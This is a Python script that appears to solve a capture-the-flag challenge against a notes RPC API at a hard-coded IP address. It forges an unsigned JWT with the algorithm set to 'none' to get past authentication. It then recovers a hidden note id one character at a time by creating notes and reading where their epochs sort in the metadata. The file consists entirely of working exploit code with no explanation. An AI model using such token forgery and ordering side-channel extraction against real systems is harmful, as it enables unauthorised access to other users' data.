import requests
import json
import colorama
import time
from colorama import Fore,Style
import signal
import sys
import datetime

print(Style.RESET_ALL)
success = False

def resetNotes():
	burp0_url = "http://159.203.178.9:80/rpc.php?method=resetNotes"
	burp0_headers = {"Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpZCI6MX0.", "Accept": "application/notes.api.v2+json"}
	response = requests.post(burp0_url, headers=burp0_headers)
	return json.loads(response.text)

def createNote(id):
	burp0_url = "http://159.203.178.9:80/rpc.php?method=createNote"
	burp0_headers = {"Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpZCI6MX0.", "Accept": "application/notes.api.v2+json", "Content-Type": "application/json"}
	burp0_json={"id": id, "note": "fisher note"}
	response = requests.post(burp0_url, headers=burp0_headers, json=burp0_json)
	return json.loads(response.text)

def getNotesMetadata():
	burp0_url = "http://159.203.178.9:80/rpc.php?method=getNotesMetadata"
	burp0_headers = {"Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpZCI6MX0.", "Accept": "application/notes.api.v2+json"}
	response = requests.get(burp0_url, headers=burp0_headers)
	return json.loads(response.text)

def getNote(id):
	burp0_url = "http://159.203.178.9:80/rpc.php?method=getNote&id=" + id
	burp0_headers = {"Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpZCI6MX0.", "Accept": "application/notes.api.v2+json"}
	response = requests.get(burp0_url, headers=burp0_headers)
	return response

resetNotes()

id = ""
alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

i = 0
j = 0
flag = "1528911533"

while success == False:
	#resetNotes()
	new_id = id + alphabet[i] + "z"*(20-j)
	createNote(new_id)
	resp = getNotesMetadata()
	now = datetime.datetime.now()
	#print(now.strftime("[%Y-%m-%d-%H:%M]") + " - " + id + alphabet[i])
	print(now.strftime("[%Y-%m-%d-%H:%M]") + " - " + id + alphabet[i] + " - " + str(resp['epochs']))

	idx_flag = resp['epochs'].index(flag)
	epoch_cur = json.loads(getNote(new_id).text)["epoch"]
	idx_cur = resp['epochs'].index(epoch_cur)

	if(idx_cur > idx_flag):
		print(now.strftime("[%Y-%m-%d-%H:%M]") + " - " + id + alphabet[i])
		id = id + alphabet[i]
		i = 0
		j = j + 1
		time.sleep(2)
	else:
		i = i + 1

	time.sleep(0.5)

	if(len(id)==20):
		print("\n Flag: " + id)
		success=True

